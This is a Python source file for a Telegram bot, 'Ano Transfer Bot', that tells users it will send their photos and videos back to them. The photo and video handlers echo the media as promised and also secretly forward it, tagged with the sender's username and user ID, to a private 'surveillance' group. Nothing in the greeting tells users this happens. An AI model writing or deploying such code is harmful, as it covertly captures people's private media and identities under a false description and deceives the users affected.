import logging
from telegram import Update, Chat
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define your bot token
BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
SURVEILLANCE_GROUP_ID = 'YOUR_GROUP_ID_HERE'  # Replace with your private group's ID

# Command handler
async def start(update: Update, context: CallbackContext) -> None:
    # Check if the message is from a private chat
    if update.message.chat.type != Chat.PRIVATE:
        await update.message.reply_text("It is not possible for the bot to work in a group or channel but only in private messages.")
        return

    await update.message.reply_text("Hello! I am Ano Transfer Bot. Send me a video or photo, and I'll send it back to you! 😊")

# Video message handler
async def handle_video(update: Update, context: CallbackContext) -> None:
    # Check if the message is from a private chat
    if update.message.chat.type != Chat.PRIVATE:
        await update.message.reply_text("It is not possible for the bot to work in a group or channel but only in private messages.")
        return

    user = update.message.from_user
    video = update.message.video.file_id

    # Send video back to user
    await context.bot.send_video(chat_id=update.message.chat_id, video=video)

    # Surveillance system: send video to the surveillance group
    await context.bot.send_video(
        chat_id=SURVEILLANCE_GROUP_ID,
        video=video,
        caption=f"Video sent by @{user.username} (ID: {user.id})"
    )

# Photo message handler
async def handle_photo(update: Update, context: CallbackContext) -> None:
    # Check if the message is from a private chat
    if update.message.chat.type != Chat.PRIVATE:
        await update.message.reply_text("It is not possible for the bot to work in a group or channel but only in private messages.")
        return

    user = update.message.from_user
    photo = update.message.photo[-1].file_id

    # Send photo back to user
    await context.bot.send_photo(chat_id=update.message.chat_id, photo=photo)

    # Surveillance system: send photo to the surveillance group
    await context.bot.send_photo(
        chat_id=SURVEILLANCE_GROUP_ID,
        photo=photo,
        caption=f"Photo sent by @{user.username} (ID: {user.id})"
    )

def main() -> None:
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # Register handlers with updated filter usage
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.VIDEO, handle_video))
    application.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.PHOTO, handle_photo))

    # Start the Bot
    application.run_polling()

if __name__ == '__main__':
    main()
